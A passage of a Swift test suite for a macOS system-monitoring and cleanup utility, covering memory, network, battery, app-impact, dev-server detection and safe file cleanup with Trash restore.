        #expect(MemoryInsights.nextMacAdvice(.oftenShort(comfortablePercent: 80), installed: 36 << 30) == "For your next Mac, consider 48 GB or more.")
        #expect(MemoryInsights.nextMacAdvice(.collecting(hoursNeeded: 3), installed: sixteen) == nil)
    }

    private func app(_ name: String, path: String, memoryMB: UInt64, pid: pid_t) -> AppUsage {
        AppUsage(id: path, name: name, bundlePath: path, kind: .application, processes: [
            ProcessUsage(pid: pid, name: name, path: path, cpu: 0, memory: memoryMB << 20, diskReadRate: 0, diskWriteRate: 0),
        ])
    }

    @Test func suggestsHeavyIdleAppsOnly() {
        let now = Date()
        let apps = [
            app("Slack", path: "/Applications/Slack.app", memoryMB: 1_800, pid: 90_001),
            app("Chrome", path: "/Applications/Google Chrome.app", memoryMB: 4_000, pid: 90_002),   // used 5 min ago
            app("Notes", path: "/Applications/Notes.app", memoryMB: 120, pid: 90_003),               // too small
            app("Finder", path: "/System/Library/CoreServices/Finder.app", memoryMB: 900, pid: 90_004), // part of macOS
            app("Figma", path: "/Applications/Figma.app", memoryMB: 2_500, pid: 90_005),             // never used since tracking
        ]
        let lastUsed: [String: Date] = [
            "/Applications/Slack.app": now.addingTimeInterval(-3 * 3600),
            "/Applications/Google Chrome.app": now.addingTimeInterval(-300),
        ]
        let suggestions = MemoryInsights.closeSuggestions(apps: apps, lastUsed: { lastUsed[$0] },
                                                          trackingSince: now.addingTimeInterval(-6 * 3600), now: now)
        #expect(suggestions.map(\.app.name) == ["Figma", "Slack"])
        #expect(suggestions.first?.lastUsed == nil)
    }

    @Test func noSuggestionsWhileStillLearning() {
        let now = Date()
        let apps = [app("Slack", path: "/Applications/Slack.app", memoryMB: 1_800, pid: 90_001)]
        #expect(MemoryInsights.closeSuggestions(apps: apps, lastUsed: { _ in nil },
                                                trackingSince: now.addingTimeInterval(-60), now: now).isEmpty)
    }

    @Test func lastUsedPhrasing() {
        let now = Date()
        #expect(MemoryInsights.describeLastUsed(now.addingTimeInterval(-45 * 60), trackingSince: now, now: now) == "Last used 45 min ago")
        #expect(MemoryInsights.describeLastUsed(now.addingTimeInterval(-3 * 3600), trackingSince: now, now: now) == "Last used 3 h ago")
        #expect(MemoryInsights.describeLastUsed(now.addingTimeInterval(-4 * 86_400), trackingSince: now, now: now) == "Last used 4 days ago")
        #expect(MemoryInsights.describeLastUsed(nil, trackingSince: now.addingTimeInterval(-7200), now: now).hasPrefix("Not used since"))
    }

    @Test func compressionRatio() {
        var memory = MemorySnapshot()
        memory.compressed = 1 << 30
        memory.compressedOriginal = 3 << 30
        #expect(memory.compressionRatio == 3)
        memory.compressed = 0
        #expect(memory.compressionRatio == nil)
    }
}

@Suite("Network")
struct NetworkTests {
    @Test func parsesPingSummary() {
        let ok = """
        PING 1.1.1.1 (1.1.1.1): 56 data bytes

        --- 1.1.1.1 ping statistics ---
        4 packets transmitted, 4 packets received, 0.0% packet loss
        round-trip min/avg/max/stddev = 7.513/10.346/12.681/2.139 ms
        """
        #expect(PingResult.parse(ok) == PingResult(averageMs: 10.346, lossPercent: 0))
        let dead = """
        --- 192.168.0.1 ping statistics ---
        4 packets transmitted, 0 packets received, 100.0% packet loss
        """
        let result = PingResult.parse(dead)
        #expect(result.lossPercent == 100 && result.averageMs == nil && !result.reachable)
        #expect(!PingResult.parse("").reachable)
    }

    @Test func parsesNettopLines() {
        let output = """
        ,bytes_in,bytes_out,
        launchd.1,0,0,
        apsd.621,250518,278381,
        Google Chrome He.8812,10485760,524288,
        garbage line
        """
        let entries = NettopReader.parse(output)
        #expect(entries.count == 3)
        #expect(entries[1] == .init(pid: 621, name: "apsd", bytesIn: 250_518, bytesOut: 278_381))
        #expect(entries[2].name == "Google Chrome He" && entries[2].pid == 8812)
    }

    @Test func parsesSpeedTestJSON() {
        let json = #"{"base_rtt":18.2,"dl_throughput":452000000,"ul_throughput":38000000,"responsiveness":1320,"dl_bytes_transferred":250000000,"ul_bytes_transferred":40000000}"#
        let result = try! #require(SpeedTestResult.parse(Data(json.utf8)))
        #expect(result.downloadMbps == 452 && result.uploadMbps == 38)
        #expect(result.responsivenessRPM == 1320 && result.bytesUsed == 290_000_000)
        #expect(NetworkInsights.speedVerdict(result) == "Very fast")
        #expect(NetworkInsights.activities(for: result).allSatisfy { $0.supported })
        #expect(SpeedTestResult.parse(Data("{}".utf8)) == nil)
    }

    @Test func slowConnectionActivities() {
        let slow = SpeedTestResult(date: Date(), downloadBitsPerSecond: 8e6, uploadBitsPerSecond: 1e6,
                                   responsivenessRPM: 150, idleLatencyMs: 60, bytesUsed: 0)
        let supported = NetworkInsights.activities(for: slow).filter(\.supported).map(\.name)
        #expect(supported == ["Browsing & email", "HD video"])
        #expect(NetworkInsights.speedVerdict(slow) == "Basic")
        #expect(NetworkInsights.responsivenessLabel(rpm: 150) == "Low")
    }

    private let online = NetworkConfig(primaryInterface: "en0", router: "192.168.0.1", localIPv4: "192.168.0.20", dnsServers: [])
    private func wifi(_ rssi: Int) -> WiFiInfo {
        WiFiInfo(interface: "en0", rssi: rssi, noise: -90, transmitRate: 800, phyMode: 6, channel: 44, band: 2, width: 3)
    }

    @Test func diagnosesWiFiVersusInternet() {
        let fastRouter = PingResult(averageMs: 3, lossPercent: 0)
        let slowRouter = PingResult(averageMs: 85, lossPercent: 0)
        let fastNet = PingResult(averageMs: 12, lossPercent: 0)
        let slowNet = PingResult(averageMs: 180, lossPercent: 0)
        let deadNet = PingResult(averageMs: nil, lossPercent: 100)

        #expect(NetworkInsights.level(config: online, wifi: wifi(-50), router: fastRouter, internet: fastNet) == .great)
        #expect(NetworkInsights.level(config: online, wifi: wifi(-50), router: fastRouter, internet: slowNet) == .slowInternet)
        #expect(NetworkInsights.level(config: online, wifi: wifi(-50), router: slowRouter, internet: slowNet) == .weakWiFi)
        #expect(NetworkInsights.level(config: online, wifi: wifi(-82), router: fastRouter, internet: fastNet) == .weakWiFi)
        #expect(NetworkInsights.level(config: online, wifi: wifi(-50), router: fastRouter, internet: deadNet) == .internetDown)
        #expect(NetworkInsights.level(config: NetworkConfig(), wifi: nil, router: nil, internet: nil) == .offline)
        #expect(NetworkInsights.level(config: online, wifi: wifi(-50), router: nil, internet: nil) == .checking)
        // Routers that ignore ping aren't blamed.
        #expect(NetworkInsights.level(config: online, wifi: wifi(-50), router: PingResult(averageMs: nil, lossPercent: 100), internet: fastNet) == .great)
    }

    @Test func signalBands() {
        #expect(NetworkInsights.signal(rssi: -53) == .excellent)
        #expect(NetworkInsights.signal(rssi: -64) == .good)
        #expect(NetworkInsights.signal(rssi: -72) == .fair)
        #expect(NetworkInsights.signal(rssi: -80) == .weak)
    }

    @Test func wifiDescriptions() {
        let info = wifi(-53)
        #expect(info.standard == "Wi-Fi 6 (802.11ax)")
        #expect(info.bandName == "5 GHz" && info.widthName == "80 MHz")
        #expect(info.signalToNoise == 37)
    }

    @Test func vpnDetection() {
        #expect(NetworkConfig(primaryInterface: "utun4", router: nil).isVPN)
        #expect(!online.isVPN)
    }

    @Test func dataUsageIntegratesRates() {
        let now = Date()
        func s(_ ago: TimeInterval, down: Double, up: Double) -> HistorySample {
            HistorySample(date: now.addingTimeInterval(-ago), cpuUser: 0, cpuSystem: 0, memoryUsedPercent: 0,
                          networkIn: down, networkOut: up, diskRead: 0, diskWrite: 0, batteryPercent: nil)
        }
        // Two 1-minute buckets at 1 MB/s down, 0.5 MB/s up = 120 MB down, 60 MB up.
        let usage = NetworkInsights.usage([s(120, down: 1e6, up: 5e5), s(60, down: 1e6, up: 5e5), s(90_000, down: 9e9, up: 9e9)],
                                          sampleLength: 60, since: now.addingTimeInterval(-3600))
        #expect(usage.received == 120e6 && usage.sent == 60e6)
    }

    @Test func liveReadersWorkOnThisMac() async {
        // Smoke test against the real system: must not crash, and nettop must parse something.
        _ = WiFiInfo.current()
        let config = NetworkConfig.current()
        #expect(config.primaryInterface == nil || !config.primaryInterface!.isEmpty)
        let entries = await NettopReader.read()
        #expect(!entries.isEmpty)
    }
}

@Suite("Battery")
struct BatteryTests {
    @Test func unsignedAmperageIsReadAsSigned() {
        // The exact value this Mac's battery reported: −829 mA stored as an unsigned 64-bit pattern.
        let raw = NSNumber(value: UInt64(18_446_744_073_709_550_787))
        #expect(Int(Int64(bitPattern: raw.uint64Value)) == -829)
    }

    @Test func parsesApplesHealthFigures() {
        let json = #"{"SPPowerDataType":[{"sppower_battery_health_info":{"sppower_battery_cycle_count":614,"sppower_battery_health":"Good","sppower_battery_health_maximum_capacity":"83%"}}]}"#
        let health = BatterySampler.parseAppleHealth(Data(json.utf8))
        #expect(health?.percent == 83 && health?.condition == "Good" && health?.cycles == 614)
        #expect(BatterySampler.parseAppleHealth(Data("{}".utf8)) == nil)
    }

    @Test func applesPercentageWinsOverOurMath() {
        var battery = BatterySnapshot()
        battery.designCapacity = 6075
        battery.maxCapacity = 5128        // our math alone would say 84.4%
        #expect(abs((battery.healthPercent ?? 0) - 84.41) < 0.01)
        battery.appleMaxCapacityPercent = 83
        #expect(battery.healthPercent == 83)   // matches System Settings
    }

    @Test func healthVerdicts() {
        #expect(BatteryInsights.health(percent: 95, condition: "Good") == .healthy)
        #expect(BatteryInsights.health(percent: 83, condition: "Good") == .normalWear)
        #expect(BatteryInsights.health(percent: 76, condition: nil) == .serviceSoon)
        #expect(BatteryInsights.health(percent: 90, condition: "Service Recommended") == .serviceSoon)
        #expect(BatteryInsights.health(percent: nil, condition: nil) == .unknown)
    }

    @Test func healthSentenceUsesRatedCycles() {
        var battery = BatterySnapshot()
        battery.appleMaxCapacityPercent = 83
        battery.cycleCount = 614
        battery.designCycleCount = 1000
        #expect(BatteryInsights.healthSentence(battery) == "It holds 83% of its original charge after 614 of about 1,000 rated charge cycles. That's normal wear; nothing to do yet.")
    }

    @Test func explainsWhyItIsNotCharging() {
        var battery = BatterySnapshot()
        battery.isPluggedIn = true
        battery.percent = 80
        #expect(BatteryInsights.chargingState(battery) == .holdingToProtect)
        #expect(BatteryInsights.chargingText(.holdingToProtect) == "Paused near 80% to protect the battery")
        battery.percent = 40
        #expect(BatteryInsights.chargingState(battery) == .pluggedNotCharging)
        battery.isCharging = true
        battery.watts = -42
        battery.adapterWatts = 67
        #expect(BatteryInsights.chargingText(BatteryInsights.chargingState(battery)) == "Charging at 42 W · 67 W charger")
    }

    @Test func personalBatteryLife() {
        let now = Date()
        func s(_ i: Int, watts: Double?) -> HistorySample {
            HistorySample(date: now.addingTimeInterval(Double(i) * 60), cpuUser: 0, cpuSystem: 0, memoryUsedPercent: 0,
                          networkIn: 0, networkOut: 0, diskRead: 0, diskWrite: 0, batteryPercent: 50, batteryWatts: watts)
        }
        // 30 minutes unplugged isn't enough to learn from…
        #expect(BatteryInsights.typicalDrain(samples: (0..<30).map { s($0, watts: 8) }, sampleLength: 60) == nil)
        // …90 minutes at 8 W is. Plugged-in time (nil) doesn't count.
        let learned = BatteryInsights.typicalDrain(samples: (0..<90).map { s($0, watts: 8) } + (0..<60).map { s($0, watts: nil) }, sampleLength: 60)
        #expect(learned == 8)
        // 58 Wh at 8 W = 7.25 h, exactly between 7 and 7½; ties round up.
        #expect(BatteryInsights.describe(hours: BatteryInsights.hours(fullChargeWattHours: 58, watts: 8)!) == "about 7½ hours")
        #expect(BatteryInsights.describe(hours: 7.1) == "about 7 hours")
        #expect(BatteryInsights.describe(hours: 7.6) == "about 7½ hours")
        #expect(BatteryInsights.describe(hours: 0.4) == "under an hour")
    }

    @Test func fullChargeEnergy() {
        var battery = BatterySnapshot()
        battery.maxCapacity = 4978
        battery.voltage = 11.615
        #expect(abs((battery.fullChargeWattHours ?? 0) - 57.82) < 0.01)
    }

    @Test func impactLabels() {
        #expect(BatteryInsights.impact(watts: 3.1) == .high)
        #expect(BatteryInsights.impact(watts: 0.8) == .medium)
        #expect(BatteryInsights.impact(watts: 0.1) == .low)
    }

    @Test func processEnergyIsMeasuredOnThisMac() {
        // Per-process energy (rusage v6) should be available on Apple silicon.
        guard let usage = ProcessSampler.resourceUsage(for: getpid()) else { Issue.record("no rusage"); return }
        #expect(usage.ri_energy_nj > 0)
    }
}

@Suite("Apps")
struct AppsTests {
    private func app(_ name: String, path: String?, kind: AppKind = .application, cpu: Double = 0, memoryMB: UInt64 = 100, watts: Double = 0) -> AppUsage {
        AppUsage(id: path ?? name, name: name, bundlePath: path, kind: kind, processes: [
            ProcessUsage(pid: 70_000 + pid_t(abs(name.hashValue % 1000)), name: name, path: path ?? "", cpu: cpu,
                         memory: memoryMB << 20, diskReadRate: 0, diskWriteRate: 0, watts: watts),
        ])
    }

    @Test func impactCombinesCPUMemoryAndEnergy() {
        let ram: UInt64 = 16 << 30
        // 80% of one core on 8 cores = 10% of the CPU → exactly "noticeable".
        #expect(AppInsights.impact(score: AppInsights.impactScore(app("A", path: nil, cpu: 80), cores: 8, totalRAM: ram)) == .high)
        // 2 GB of 16 GB = 12.5% of RAM → high even with no CPU.
        #expect(AppInsights.impact(score: AppInsights.impactScore(app("B", path: nil, memoryMB: 2048), cores: 8, totalRAM: ram)) == .high)
        // 1 W → medium.
        #expect(AppInsights.impact(score: AppInsights.impactScore(app("C", path: nil, watts: 1), cores: 8, totalRAM: ram)) == .medium)
        #expect(AppInsights.impact(score: AppInsights.impactScore(app("D", path: nil, cpu: 2, memoryMB: 150), cores: 8, totalRAM: ram)) == .low)
    }

    @Test func rolesFromActivationPolicy() {
        let policies: [String: NSApplication.ActivationPolicy] = [
            "/Applications/Safari.app": .regular,
            "/Applications/Bartender.app": .accessory,
            "/System/Library/CoreServices/Finder.app": .regular,
        ]
        #expect(AppInsights.role(for: app("Safari", path: "/Applications/Safari.app"), policies: policies) == .app)
        #expect(AppInsights.role(for: app("Bartender", path: "/Applications/Bartender.app"), policies: policies) == .background)
        #expect(AppInsights.role(for: app("Finder", path: "/System/Library/CoreServices/Finder.app"), policies: policies) == .app)
        #expect(AppInsights.role(for: app("Dock", path: "/System/Library/CoreServices/Dock.app"), policies: policies) == .system)
        #expect(AppInsights.role(for: app("macOS", path: nil, kind: .system), policies: policies) == .system)
        #expect(AppInsights.role(for: app("postgres", path: nil, kind: .process), policies: policies) == .background)
    }

    private func series(minutes: Int, every seconds: TimeInterval = 30, cpu: (Int) -> Double, memoryMB: (Int) -> UInt64) -> [AppInsights.TrendPoint] {
        let now = Date()
        let count = Int(Double(minutes * 60) / seconds)
        return (0...count).map { i in
            AppInsights.TrendPoint(date: now.addingTimeInterval(-Double(count - i) * seconds), cpu: cpu(i), memory: memoryMB(i) << 20)
        }
    }

    @Test func flagsAppStuckBusy() {
        let points = series(minutes: 12, cpu: { _ in 98 }, memoryMB: { _ in 500 })
        guard case .stuckBusy(let cpu, let minutes) = AppInsights.stuckBusy(points, now: Date()) else {
            Issue.record("expected stuck busy"); return
        }
        #expect(cpu == 98 && minutes >= 11)
    }

    @Test func briefSpikesAreNotStuck() {
        // Busy, then a quiet moment within the last 5 minutes → normal work, not stuck.
        let points = series(minutes: 12, cpu: { $0 == 20 ? 5 : 95 }, memoryMB: { _ in 500 })
        #expect(AppInsights.stuckBusy(points, now: Date()) == nil)
        // Only 2 minutes of data → not enough to judge.
        #expect(AppInsights.stuckBusy(series(minutes: 2, cpu: { _ in 99 }, memoryMB: { _ in 1 }), now: Date()) == nil)
    }

    @Test func flagsSteadyMemoryGrowth() {
        // 1 GB → 3 GB over 30 minutes, rising steadily.
        let points = series(minutes: 30, cpu: { _ in 5 }, memoryMB: { 1024 + UInt64($0) * 34 })
        guard case .growingMemory(let from, let to, let minutes) = AppInsights.growingMemory(points, now: Date()) else {
            Issue.record("expected growing memory"); return
        }
        #expect(from == 1024 << 20)
        #expect(to == UInt64(1024 + 60 * 34) << 20)  // 61 points, 34 MB apart
        #expect(minutes == 30)
    }

    @Test func sawtoothMemoryIsNotALeak() {
        // Goes up and down (normal caching); ends higher but isn't steadily rising.
        let points = series(minutes: 30, cpu: { _ in 5 }, memoryMB: { i in i % 2 == 0 ? 1000 : 3200 })
        #expect(AppInsights.growingMemory(points, now: Date()) == nil)
        // Small absolute growth (200 → 500 MB) isn't worth flagging either.
        #expect(AppInsights.growingMemory(series(minutes: 30, cpu: { _ in 0 }, memoryMB: { 200 + UInt64($0) * 5 }), now: Date()) == nil)
    }

    @Test func trackerThinsAndForgetsQuitApps() {
        var tracker = AppTrendTracker()
        let start = Date()
        let safari = app("Safari", path: "/Applications/Safari.app")
        tracker.record([safari], at: start)
        tracker.record([safari], at: start.addingTimeInterval(5))   // too soon, thinned
        tracker.record([safari], at: start.addingTimeInterval(25))
        #expect(tracker.points[safari.id]?.count == 2)
        tracker.record([], at: start.addingTimeInterval(60))          // Safari quit
        #expect(tracker.points.isEmpty)
        // macOS itself is never tracked.
        tracker.record([app("macOS", path: nil, kind: .system)], at: start)
        #expect(tracker.points.isEmpty)
    }

    @Test func glossaryExplainsCommonProcesses() {
        #expect(ProcessGlossary.explain("mds_stores")?.what.contains("Spotlight") == true)
        #expect(ProcessGlossary.explain("com.apple.WebKit.WebContent")?.what.contains("web page") == true)
        #expect(ProcessGlossary.explain("Google Chrome Helper (Renderer)")?.what.contains("tab") == true)
        #expect(ProcessGlossary.explain("Google Chrome Helper (GPU)")?.what.contains("graphics") == true)
        #expect(ProcessGlossary.explain("SomeRandomDaemon") == nil)
    }
}

@Suite("Dev servers")
struct DevServerTests {
    @Test func recognizesCommonServers() {
        #expect(ServerInsights.tech(command: "node", arguments: ["node", "/proj/node_modules/.bin/vite", "--port", "5173"], port: 5173)?.name == "Vite")
        #expect(ServerInsights.tech(command: "node", arguments: ["node", "/proj/node_modules/.bin/next", "dev"], port: 3000)?.name == "Next.js")
        #expect(ServerInsights.tech(command: "python3.12", arguments: ["python3", "manage.py", "runserver"], port: 8000)?.name == "Django")
        #expect(ServerInsights.tech(command: "postgres", arguments: ["postgres", "-D", "/usr/local/var/postgres"], port: 5432)?.name == "PostgreSQL")
        #expect(ServerInsights.tech(command: "node", arguments: ["node", "server.js"], port: 4000)?.name == "Node.js")
        // Unknown binary on a well-known port falls back to the port.
        #expect(ServerInsights.tech(command: "mystery", arguments: [], port: 6379)?.name == "Redis")
        #expect(ServerInsights.tech(command: "mystery", arguments: [], port: 4321) == nil)
    }

    @Test func explainsMacOSServices() {
        #expect(ServerInsights.service(command: "ControlCenter", port: 7000)?.name == "AirPlay Receiver")
        #expect(ServerInsights.service(command: "ControlCenter", port: 7000)?.settingsHint?.contains("AirPlay Receiver") == true)
        #expect(ServerInsights.service(command: "rapportd", port: 49152)?.name == "Continuity")
        #expect(ServerInsights.service(command: "launchd", port: 22)?.name == "Remote Login (SSH)")
        #expect(ServerInsights.service(command: "cloudflared", port: 20241)?.explanation.contains("internet") == true)
        #expect(ServerInsights.service(command: "ollama", port: 11434)?.name == "Ollama")
        #expect(ServerInsights.service(command: "SomethingElse", port: 50001) == nil)
    }

    @Test func idleNeedsTimeAndQuiet() {
        #expect(ServerInsights.isIdle(cpu: 0.1, uptime: 3 * 3600))
        #expect(!ServerInsights.isIdle(cpu: 0.1, uptime: 10 * 60))   // just started
        #expect(!ServerInsights.isIdle(cpu: 12, uptime: 3 * 3600))    // busy
        #expect(!ServerInsights.isIdle(cpu: 0, uptime: nil))
    }

    @Test func uptimePhrasing() {
        #expect(ServerInsights.describeUptime(30) == "just started")
        #expect(ServerInsights.describeUptime(25 * 60) == "25 min")
        #expect(ServerInsights.describeUptime(5 * 3600) == "5 h")
        #expect(ServerInsights.describeUptime(3 * 86_400) == "3 days")
    }

    @Test func groupsServersByProject() {
        let home = FileManager.default.homeDirectoryForCurrentUser.path
        let ports = [
            ListeningPort(pid: 1, command: "node", port: 5173, addresses: ["127.0.0.1"], workingDirectory: home + "/Developer/shop"),
            ListeningPort(pid: 2, command: "node", port: 3000, addresses: ["127.0.0.1"], workingDirectory: home + "/Developer/shop"),
            ListeningPort(pid: 3, command: "ruby", port: 4567, addresses: ["*"], workingDirectory: home + "/Developer/blog"),
            ListeningPort(pid: 4, command: "rapportd", port: 49152, addresses: ["*"], workingDirectory: nil),
        ]
        let projects = ServerInsights.projects(ports)
        #expect(projects.map(\.name) == ["blog", "shop"])
        #expect(projects[1].servers.map(\.port) == [3000, 5173])
    }

    @Test func oneRowPerServiceEvenWithSeveralPorts() {
        let ports = [
            ListeningPort(pid: 500, command: "ControlCenter", port: 7000, addresses: ["*"], workingDirectory: nil),
            ListeningPort(pid: 500, command: "ControlCenter", port: 5000, addresses: ["*"], workingDirectory: nil),
            ListeningPort(pid: 600, command: "mediasharingd", port: 3689, addresses: ["*"], workingDirectory: nil),
        ]
        let groups = ServerInsights.serviceGroups(ports)
        #expect(groups.map(\.name) == ["AirPlay Receiver", "Media Sharing"])
        #expect(groups[0].portList == ":5000 · :7000")   // no thousands separators, sorted
        #expect(!groups[0].isLocalOnly)
    }

    @Test func parsesKernelArgumentBuffer() {
        var buffer: [UInt8] = withUnsafeBytes(of: Int32(3)) { Array($0) }
        buffer += Array("/usr/bin/python3".utf8) + [0, 0, 0, 0]
        for arg in ["python3", "-m", "http.server"] { buffer += Array(arg.utf8) + [0] }
        buffer += Array("PATH=/usr/bin".utf8) + [0] // environment follows; must be ignored
        #expect(ProcessDetails.parseProcArgs(buffer) == ["python3", "-m", "http.server"])
    }

    @Test func findsARealLocalServerEndToEnd() async throws {
        // A real project folder under home, a real server bound to localhost.
        let folder = FileManager.default.homeDirectoryForCurrentUser.appending(path: "Library/Caches/MacVitalsTests-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }
        let port = 48_765
        let server = Process()
        server.executableURL = URL(fileURLWithPath: "/usr/bin/python3")
        server.arguments = ["-m", "http.server", "\(port)", "--bind", "127.0.0.1"]
        server.currentDirectoryURL = folder
        server.standardOutput = FileHandle.nullDevice
        server.standardError = FileHandle.nullDevice
        try server.run()
        defer { server.terminate() }

        var found: ListeningPort?
        for _ in 0..<20 where found == nil {
            try await Task.sleep(for: .milliseconds(250))
            found = try PortScanner.scan().first { $0.port == port }
        }
        let entry = try #require(found, "server on :\(port) not found")
        #expect(entry.isDevServer)
        #expect(entry.isLocalOnly)
        #expect(entry.projectName == folder.lastPathComponent)
        #expect(entry.tech?.name == "Python file server")
        #expect(entry.arguments.contains("http.server"))
        #expect((entry.uptime ?? 999) < 30)
    }
}

@Suite("Clean Up engine")
struct CleanUpTests {
    private let fm = FileManager.default

    /// A fake home with projects of different ages and a Downloads folder.
    private func makeHome(now: Date) throws -> URL {
        let home = fm.temporaryDirectory.appending(path: "mv-cleanup-\(UUID().uuidString)")
        func file(_ path: String, size: Int = 2_000_000, age days: Double) throws {
            let url = home.appending(path: path)
            try fm.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
            try Data(count: size).write(to: url)
            let date = now.addingTimeInterval(-days * 86_400)
            try fm.setAttributes([.modificationDate: date], ofItemAtPath: url.path)
        }
        // Idle 5 months → safe.
        try file("Developer/old-shop/package.json", size: 10, age: 150)
        try file("Developer/old-shop/pnpm-lock.yaml", size: 10, age: 150)
        try file("Developer/old-shop/node_modules/react/index.js", age: 150)
        try file("Developer/old-shop/node_modules/react/node_modules/nested/x.js", age: 150) // not reported separately
        // Idle 45 days → review.
        try file("Developer/py-tool/pyproject.toml", size: 10, age: 45)
        try file("Developer/py-tool/.venv/pyvenv.cfg", size: 10, age: 45)
        try file("Developer/py-tool/.venv/lib/big.so", age: 45)
        // Active this week → left alone.
        try file("Developer/current-app/package.json", size: 10, age: 2)
        try file("Developer/current-app/node_modules/lib/index.js", age: 2)
        // Rust project, idle a year.
        try file("Projects/rusty/Cargo.toml", size: 10, age: 400)
        try file("Projects/rusty/target/debug/app", age: 400)
        // A "target" folder that isn't Rust must NOT be flagged.
        try file("Projects/not-rust/readme.md", size: 10, age: 400)
        try file("Projects/not-rust/target/important.txt", age: 400)
        // SwiftPM
        try file("Developer/swifty/Package.swift", size: 10, age: 200)
        try file("Developer/swifty/.build/debug/thing", age: 200)
        // Downloads: an old installer (safe), a fresh one (review).
        try file("Downloads/OldApp.dmg", age: 60)
        try file("Downloads/NewApp.dmg", age: 2)
        return home
    }

    @Test func findsDependenciesInIdleProjectsOnly() throws {
        let now = Date()
        let home = try makeHome(now: now)
        defer { try? fm.removeItem(at: home) }
        let items = ProjectJunk.find(home: home, now: now)
        let byName = Dictionary(uniqueKeysWithValues: items.map { ($0.name, $0) })

        #expect(Set(byName.keys) == ["old-shop/node_modules", "py-tool/.venv", "rusty/target", "swifty/.build"])
        #expect(byName["old-shop/node_modules"]?.tier == .safe)
        #expect(byName["py-tool/.venv"]?.tier == .review)
        #expect(byName["rusty/target"]?.tier == .safe)
        // The reinstall hint follows the lockfile.
        #expect(byName["old-shop/node_modules"]?.detail?.contains("pnpm install") == true)
        #expect(byName["old-shop/node_modules"]?.detail?.contains("not touched in 5 months") == true)
    }

    @Test func downloadsTiersInstallersByAge() throws {
        let now = Date()
        let home = try makeHome(now: now)
        defer { try? fm.removeItem(at: home) }
        let scan = JunkScanners.downloads(home: home, now: now)
        let installers = try #require(scan.groups.first { $0.id == "installers" })
        let tiers = Dictionary(uniqueKeysWithValues: installers.items.map { ($0.name, $0.tier) })
        #expect(tiers == ["OldApp.dmg": .safe, "NewApp.dmg": .review])
    }

    @Test func trashItemsAreCarefulAndPermanent() throws {
        let home = fm.temporaryDirectory.appending(path: "mv-trash-\(UUID().uuidString)")
        try fm.createDirectory(at: home.appending(path: ".Trash"), withIntermediateDirectories: true)
        try Data(count: 2_000_000).write(to: home.appending(path: ".Trash/old.zip"))
        defer { try? fm.removeItem(at: home) }
        let scan = JunkScanners.trash(home: home)
        #expect(scan.groups.first?.isPermanent == true)
        #expect(scan.items.allSatisfy { $0.tier == .careful })
    }

    @Test func neverTouchesSystemLocations() {
        #expect(CleanupRemover.isProtected("/System/Library/Caches"))
        #expect(CleanupRemover.isProtected("/usr/lib"))
        #expect(CleanupRemover.isProtected(FileManager.default.homeDirectoryForCurrentUser.path))
        #expect(!CleanupRemover.isProtected(FileManager.default.homeDirectoryForCurrentUser.path + "/Library/Caches/foo"))
        let record = CleanupRemover.remove([JunkItem(path: "/System/Library/Fonts", name: "Fonts", size: 1, tier: .safe)], permanently: true)
        #expect(record.entries.isEmpty && record.failures == ["Fonts"])
    }

    @Test func trashPutBackAndEmptyRoundTrip() throws {
        let folder = fm.temporaryDirectory.appending(path: "mv-roundtrip-\(UUID().uuidString)")
        try fm.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? fm.removeItem(at: folder) }
        let a = folder.appending(path: "cache-a")
        let b = folder.appending(path: "cache-b")
        try Data(count: 1_500_000).write(to: a)
        try Data(count: 1_500_000).write(to: b)
        let items = [a, b].map { JunkItem(path: $0.path, name: $0.lastPathComponent, size: 1_500_000, tier: .safe) }

        // 1. Clean → both land in the Trash and the record knows where.
        let record = CleanupRemover.remove(items, permanently: false)
        #expect(record.entries.count == 2 && record.movedToTrash == 3_000_000)
        #expect(!fm.fileExists(atPath: a.path) && !fm.fileExists(atPath: b.path))
        #expect(record.restorable.count == 2)

        // 2. Put back → both return to their original paths.
        #expect(CleanupRemover.putBack(record) == 2)
        #expect(fm.fileExists(atPath: a.path) && fm.fileExists(atPath: b.path))

        // 3. Clean again, then Empty now → gone for good, nothing left to restore.
        let second = CleanupRemover.remove(items, permanently: false)
        let finalized = CleanupRemover.finalize(second)
        #expect(finalized.restorable.isEmpty)
        #expect(finalized.deletedPermanently == 3_000_000)
        #expect(second.entries.compactMap(\.trashedPath).allSatisfy { !fm.fileExists(atPath: $0) })
    }

    @Test func supersededDeviceSupportIsSafe() {
        let items = ["iPhone17,1 27.0 (24A435)", "iPhone17,1 27.0 (24A5430a)", "iPhone17,1 27.0 (24A5418b)",
                     "iPhone15,2 26.4 (23E244)", "17.2 (21C62)"].map {
            JunkItem(path: "/x/\($0)", name: $0, size: 7_000_000_000, tier: .review)
        }
        let result = Dictionary(uniqueKeysWithValues: DeviceSupport.classify(items).map { ($0.name, $0) })
        // Release build is kept; both betas of the same version are superseded.
        #expect(result["iPhone17,1 27.0 (24A435)"]?.tier == .review)
        #expect(result["iPhone17,1 27.0 (24A5430a)"]?.tier == .safe)
        #expect(result["iPhone17,1 27.0 (24A5418b)"]?.tier == .safe)
        #expect(result["iPhone17,1 27.0 (24A5418b)"]?.detail == "Superseded: this device now uses 27.0 (24A435)")
        // Only one folder for these devices: nothing superseded.
        #expect(result["iPhone15,2 26.4 (23E244)"]?.tier == .review)
        #expect(result["17.2 (21C62)"]?.tier == .review)
    }

    @Test func deviceSupportVersionOrdering() {
        let old = DeviceSupport.parse("iPad13,4 18.6 (22G86)")!
        let new = DeviceSupport.parse("iPad13,4 26.0 (23A341)")!
        #expect(DeviceSupport.isNewer(new, than: old))
        #expect(!DeviceSupport.isNewer(old, than: new))
        #expect(DeviceSupport.parse("iPhone17,1 27.0 (24A5430a)") == .init(device: "iPhone17,1", version: [27, 0], build: "24A5430a"))
    }

    @Test func historyPersists() throws {
        let url = fm.temporaryDirectory.appending(path: "mv-history-\(UUID().uuidString).json")
        defer { try? fm.removeItem(at: url) }
        let record = CleanupRecord(id: UUID(), date: Date(), entries: [
            .init(name: "x", originalPath: "/tmp/x", trashedPath: nil, size: 42),
        ], failures: [])
        CleanupHistoryStore.save([record], to: url)
        let loaded = CleanupHistoryStore.load(from: url)
        #expect(loaded.count == 1 && loaded[0].id == record.id && loaded[0].deletedPermanently == 42)
    }
}

@Suite("Uninstaller")
struct UninstallerTests {
    private let fm = FileManager.default

    private func put(_ home: URL, _ path: String, size: Int = 1_000_000) throws {
        let url = home.appending(path: path)
